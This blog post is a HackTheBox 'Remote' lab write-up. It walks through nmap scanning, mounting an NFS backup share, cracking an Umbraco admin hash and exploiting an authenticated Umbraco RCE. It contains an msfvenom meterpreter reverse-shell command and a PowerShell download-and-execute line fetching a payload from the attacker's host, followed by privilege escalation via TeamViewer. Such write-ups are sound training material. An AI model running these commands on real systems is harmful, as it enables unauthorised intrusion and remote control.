---
date: 2020-09-04 23:48:05
layout: post
title: HackTheBox Remote Writeup
subtitle: Hackthebox Remote Writeup.
description: >-
  in this blog i've explained how to solve openadmin machine in hackthebox
image: https://i.ibb.co/P9ByhXj/logo.png
optimized_image: https://i.ibb.co/P9ByhXj/logo.png
category: hackthebox
tags:
  - hackthebox
  - Remote
author: Ahmed Fatouh
paginate: true
---


# []() Methodology

* Nmap scan
* find some mounted files.
* find username and password of Umbraco cms
* Execute command with Umbraco exploit and got reverse shell.
* got user.
* Privilege Escalation.

# []() Nmap Scan

* as always, i'll do nmap scan to find out which services running in this machine.

> i found some useful ports like 21 for ftp and **Anonymous FTP login allowed**, 80 for **Microsoft HTTPAPI**.

> **nmap -sC -sV -p- -oN scan.txt 10.10.10.180**

```ruby

Nmap scan report for 10.10.10.180
Host is up (0.44s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m36s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-10T20:52:24
|_  start_date: N/A


```

# []() FTP Anonymous Login

> **first thing we should login to ftp and catch any important files but i didn't find anything.**

| Command        | Username          | Password |
|:-------------|:------------------|:------|
| ftp 10.10.10.80           | anonymous | anonymous  |

![ftp](https://i.ibb.co/1sr2KmP/ftp.png)

# []() Checking the Web-Page

* the web page was very simple and contain some useful data like usernames.

![](https://i.ibb.co/tZtRStB/webpage1.png)

* and here's some usernames.

![](https://i.ibb.co/VYL2nQH/wbpage2.png)

* as always i tried to bruteforce the username and password for the smb but i failed so let's enumerate some.

* when i ran gobuster i found an dir for umbraco cms.

> **gobuster dir -u http://10.10.10.180/ -w /usr/share/dirb/wordlists/common.txt -s 200**

![gobuster](https://i.ibb.co/db7f3xZ/gobuster.png)

* and here is the cms login page.

![cms](https://i.ibb.co/ZmTHzBg/cms.png)

* this cms vulnerable to auth RCE so we need some credentials.

> after enumerated some mounted files from the machine i found the user and the password.

| Command1        | Command2          | Command3 |
|:-------------|:------------------|:------|
| /usr/sbin/showmount -e 10.10.10.180           | mkdir mounted_files | sudo mount 10.10.10.180://site_backups ./mounted_files  |

![](https://i.ibb.co/wyKCwdn/mount.png)

> **in the Web.config file, i noticed the connection date will be stored in the Umbraco.sdf.**

![](https://i.ibb.co/w4W9x6c/subl.png)

* let's see what is in Umbraco.sdf. this file in App_Data dir.

![](https://i.ibb.co/m8v96XX/admin.png)


| Username        | Email          | Password |
|:-------------|:------------------|:------|
| admin          | admin@htb.local | b8be16afba8c314ad33d812f22a04991b90e2aaa  |

* the password encrypted with SHA1. let's decrypt it.

![](https://i.ibb.co/ZW3fNL2/password.png)

* Password: **baconandcheese**

* let's login to the cms panel.

![](https://i.ibb.co/wpVjHSv/cmspage.png)

* now we can use this [Umbraco-RCE Exploit](https://github.com/noraj/Umbraco-RCE.git) to get reverse shell.

* let's test the exploit.

* first we need a reverse shell to upload it to the machine to give us reverse shell.

> **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=HOST LPORT=PORT -f psh -o reverse-shell.ps1**

* now let's upload our reverse shell to the machine with the exploit.

> **./umbraco_cve.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.xx.xx:80/reverse.ps1')"**

![reverse-shell](https://i.ibb.co/BTq01sQ/reverse-shell.png)

* and we got user flag.

* after some enumeration i found that TeamViewer was installed in this box. so run this command in the meterpreter session.

* here's the administrator password.

![](https://i.ibb.co/JKYhsvG/root.png)

* there is another way to get root with UsoSvc service and you can read about it from here. [hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)

* let's login as administrator now with evil-winrm.

![](https://i.ibb.co/yqz7qKC/final.png)

* Thanks for reading.
* Cheers!

<script src="https://www.hackthebox.eu/badge/103789"></script>









